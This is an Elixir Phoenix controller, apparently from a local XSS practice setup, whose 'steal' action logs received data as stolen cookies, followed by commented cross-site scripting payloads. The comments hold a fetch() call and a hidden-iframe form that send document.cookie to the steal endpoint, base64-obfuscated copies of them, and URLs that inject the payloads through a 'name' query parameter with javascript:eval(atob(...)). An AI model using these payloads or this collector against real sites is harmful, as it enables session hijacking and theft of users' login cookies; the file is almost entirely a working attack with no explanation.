defmodule GrapherWeb.XssController do
  use GrapherWeb, :controller

  def steal(conn, params) do
    IO.inspect(params, label: "stealed cookie")
    send_resp(conn, 200, "done")
  end
end

# fetch('http://localhost:4000/steal', {
#   method: 'POST', // Specify the request method as POST
#   headers: {
#     'Content-Type': 'application/json' // Set the content type to JSON
#   },
#   body: JSON.stringify({cookie: document.cookie}) // Convert the data to a JSON string
# })
# ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6NDAwMC9zdGVhbCcsIHsKICBtZXRob2Q6ICdQT1NUJywgLy8gU3BlY2lmeSB0aGUgcmVxdWVzdCBtZXRob2QgYXMgUE9TVAogIGhlYWRlcnM6IHsKICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgLy8gU2V0IHRoZSBjb250ZW50IHR5cGUgdG8gSlNPTgogIH0sCiAgYm9keTogSlNPTi5zdHJpbmdpZnkoe2Nvb2tpZTogZG9jdW1lbnQuY29va2llfSkgLy8gQ29udmVydCB0aGUgZGF0YSB0byBhIEpTT04gc3RyaW5nCn0p
# http://localhost:4000/home?name=javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6NDAwMC9zdGVhbCcsIHsKICBtZXRob2Q6ICdQT1NUJywgLy8gU3BlY2lmeSB0aGUgcmVxdWVzdCBtZXRob2QgYXMgUE9TVAogIGhlYWRlcnM6IHsKICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgLy8gU2V0IHRoZSBjb250ZW50IHR5cGUgdG8gSlNPTgogIH0sCiAgYm9keTogSlNPTi5zdHJpbmdpZnkoe2Nvb2tpZTogZG9jdW1lbnQuY29va2llfSkgLy8gQ29udmVydCB0aGUgZGF0YSB0byBhIEpTT04gc3RyaW5nCn0p'));

# var form = document.createElement("form");
#         form.setAttribute("action", "http://localhost:4000/steal");
#         form.setAttribute("id", "payload");
#         form.setAttribute("method", "POST");
#         form.setAttribute("target", "_top")
#         var input = document.createElement("input");
#         input.setAttribute("type", "text");
#         input.setAttribute("name", "grow_id");
#         input.setAttribute("value", "23r2r2");
#         form.appendChild(input);
#         document.body.appendChild(form);
#         console.log('submitting form');
# dmFyIGZvcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7CiAgICAgICAgZm9ybS5zZXRBdHRyaWJ1dGUoImFjdGlvbiIsICJodHRwOi8vbG9jYWxob3N0OjQwMDAvc3RlYWwiKTsKICAgICAgICBmb3JtLnNldEF0dHJpYnV0ZSgiaWQiLCAicGF5bG9hZCIpOwogICAgICAgIGZvcm0uc2V0QXR0cmlidXRlKCJtZXRob2QiLCAiUE9TVCIpOwogICAgICAgIGZvcm0uc2V0QXR0cmlidXRlKCJ0YXJnZXQiLCAiX3RvcCIpCiAgICAgICAgdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKICAgICAgICBpbnB1dC5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dCIpOwogICAgICAgIGlucHV0LnNldEF0dHJpYnV0ZSgibmFtZSIsICJncm93X2lkIik7CiAgICAgICAgaW5wdXQuc2V0QXR0cmlidXRlKCJ2YWx1ZSIsICIyM3IycjIiKTsKICAgICAgICBmb3JtLmFwcGVuZENoaWxkKGlucHV0KTsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGZvcm0pOwogICAgICAgIGNvbnNvbGUubG9nKCdzdWJtaXR0aW5nIGZvcm0nKTs=
  # http://localhost:4000/home?name=javascript:eval(atob('dmFyIGZvcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7CiAgICAgICAgZm9ybS5zZXRBdHRyaWJ1dGUoImFjdGlvbiIsICJodHRwOi8vbG9jYWxob3N0OjQwMDAvc3RlYWwiKTsKICAgICAgICBmb3JtLnNldEF0dHJpYnV0ZSgiaWQiLCAicGF5bG9hZCIpOwogICAgICAgIGZvcm0uc2V0QXR0cmlidXRlKCJtZXRob2QiLCAiUE9TVCIpOwogICAgICAgIGZvcm0uc2V0QXR0cmlidXRlKCJ0YXJnZXQiLCAiX3RvcCIpCiAgICAgICAgdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKICAgICAgICBpbnB1dC5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dCIpOwogICAgICAgIGlucHV0LnNldEF0dHJpYnV0ZSgibmFtZSIsICJncm93X2lkIik7CiAgICAgICAgaW5wdXQuc2V0QXR0cmlidXRlKCJ2YWx1ZSIsICIyM3IycjIiKTsKICAgICAgICBmb3JtLmFwcGVuZENoaWxkKGlucHV0KTsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGZvcm0pOwogICAgICAgIGNvbnNvbGUubG9nKCdzdWJtaXR0aW5nIGZvcm0nKTs'));

  # var iframe = document.createElement("iframe");
  #       iframe.style.display = "none";
  #       iframe.name = "hidden_iframe";
  #       document.body.appendChild(iframe);
  #       var form = document.createElement("form");
  #       form.setAttribute("action", "http://localhost:4000/steal");
  #       form.setAttribute("id", "payload");
  #       form.setAttribute("method", "POST");
  #       form.setAttribute("target", "hidden_iframe")
  #       var input = document.createElement("input");
  #       input.setAttribute("type", "text");
  #       input.setAttribute("name", "cookie");
  #       input.setAttribute("value", document.cookie);
  #       form.appendChild(input);
  #       document.body.appendChild(form);
  #       console.log('submitting form');
  #       form.submit()
